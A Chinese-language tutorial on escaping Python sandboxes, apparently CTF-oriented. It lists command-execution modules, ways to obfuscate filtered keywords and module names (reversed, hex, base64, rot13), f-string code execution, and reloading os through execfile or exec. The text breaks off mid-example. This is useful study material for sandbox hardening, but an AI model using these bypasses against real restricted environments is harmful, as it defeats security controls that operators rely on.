# 沙箱逃逸
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
**相关文章**
- [初探Python沙箱逃逸](https://qianfei11.github.io/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)
- [IS-pwn-escape-python沙箱逃逸](https://hitworld.github.io/posts/8722019b/)
- [Python 沙盒](http://dyf.ink/pwn/linux/sandbox/python-sandbox-escape/)
- [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/)
---
## 什么是沙箱逃逸
沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终拿到 shell。
---
## python如何执行命令
python 可以使用以下几个模块执行系统命令
```py
import os
import subprocess
import commands
import pty
os.system('ifconfig')
os.popen('ifconfig')
commands.getoutput('ifconfig')
commands.getstatusoutput('ifconfig')
subprocess.call('ifconfig', shell = True)
subprocess.Popen('ifconfig', shell = True)
pty.spawn('ifconfig')
```
对于不同的 py 版本可能情况不一样,记得获取当前的 Python 环境
```py
import sys
print(sys.version)
```
### timeit 模块
用于测试小代码片段的运行时间（number 即表示测试的次数）：
```py
import timeit
timeit.timeit("__import__('os').system('pwd')", number=1)
```
### platform 模块
类似 os 模块的 popen，可以执行命令：
```py
import platform
platform.popen('pwd').read()
```
### codecs 模块
可以用来读文件：
```py
import codecs
codecs.open('test.py').read()
```
### exec()、eval()、execfile()、compile() 函数
exec()：动态运行代码段，返回值为 None
eval()：计算单个表达式的值，有返回值
execfile()：动态运行某个文件中的代码
compile()：将一个字符串编译为字节代码
```py
import os
o = compile("os.system('ifconfig')", '', 'exec')
exec(o)
eval(o)
```
```py
# test.py
import os
os.system('ifconfig')
# test2.py
execfile("test.py")
```
---
## 字符串过滤的绕过
如果是某个字符串被过滤了，可以对它进行一些变换：
```py
d = {'key': 1}
print d['yek'[::-1]]
```
如果是关键字被过滤了，可以使用 getattr。getattr 接收两个参数，第一个是模块或对象，第二个是一个字符串。它会在模块或对象中搜索指定的函数或属性：
```py
import os
print getattr(os,'676574637764'.decode('hex'))()
```
也可以使用 `# coding:` 编码整个文件.
---
## import 花式处理
import 关键字用来导入包，沙箱中对一些包或是函数进行了屏蔽，从 import 的不同方法到 import 的本质有多种不同的绕过方法。
### 使用其他的方式来导入其他包名
```py
__import__('pwn').__dict__["elf"]
__import__('Y29tbWFuZHM='.decode('base64')).getoutput('pwd')
import importlib
x = importlib.import_module('pbzznaqf'.decode('rot_13'))
print x.getoutput('pwd')
```
---
## f修饰符
在PEP 498(python > 3.6.0)中引入了新的字符串类型修饰符:f或F,用f修饰的字符串将可以执行代码.可以理解为字符串外层套了一个exec().
```py
f'{print("test")}'
f'{__import__("os").system("whoami")}'
```
---
## 模块路径
Python 中的所有包都是以 .py 文件的形式存在的，说明所有 import 进来的包一开始都预先在某个位置了。一般和系统相关的信息都在 sys 下，使用 sys.path 查看各个包的路径：
```py
import sys
print sys.path
# sys 下还有一个 modules，返回一个字典，其中可以查看各个模块对应的系统路径。如果修改这个字典中的内容，前面使用的方法就都失效了
print sys.modules['os']
```
如果把 sys、os、reload 等一系列模块都过滤掉了，使用什么方法来绕过呢？导入模块的过程其实就是把对应模块的代码执行一遍的过程，在知道模块对应路径的情况下，就可以相应地执行它：
```py
execfile('/usr/lib/python2.7/os.py')
system('pwd')
```
在 execfile 被禁止的情况下，还可以用 open 读入文件，并使用 exec 来执行相应的代码：
```py
code = open('/usr/lib/python2.7/os.py', 'r').read()
exec code
print getcwd()
```
---
## 内置函数
python存在一些内置函数(即默认已经导入的函数),对应的内置模块__builtins__.
内置函数 dir() 在没有参数的时候返回本地作用域中的名称列表, 有参数的时候返回参数对象的有效属性列表. 可以通过 `dir(__builtins__)` 获取内置函数列表, 然后通过 dict 引入模块, dict 的作用是列出一个模组 / 类 / 对象下所有的属性和函数.
如果一些内置函数被删除, 可以通过 `reload(__builtins__)` 重新载入.
```
del __builtins__.__dict__['execfile']
```
在 python3.x 版本中,`__builtin__` 变成了 `builtins` 模块, 而且需要导入.
### dir 和 `__dict__`
dir 和 `__dict__` 可以用来查看类或对象下的所有属性信息：
```py
class A():
    def __init__(self):
        self.a = 'a'